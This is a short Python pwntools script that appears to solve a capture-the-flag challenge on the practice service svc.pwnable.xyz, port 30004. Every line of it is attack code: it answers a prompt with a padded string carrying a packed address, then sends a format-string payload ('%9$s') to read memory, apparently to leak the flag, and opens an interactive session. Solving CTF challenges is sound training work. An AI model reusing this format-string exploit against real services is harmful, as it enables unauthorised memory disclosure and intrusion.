from pwn import *

p = remote("svc.pwnable.xyz",30004)
#p = process("./attackme")
p.recvuntil("Are you 18 years or older? [y/N]:")
p.send("Y".ljust(8,"\x00")+p64(0x601080))

fmst = "%9$s"
p.send("A"*0x20+fmst.ljust(0x60,"B"))
p.interactive()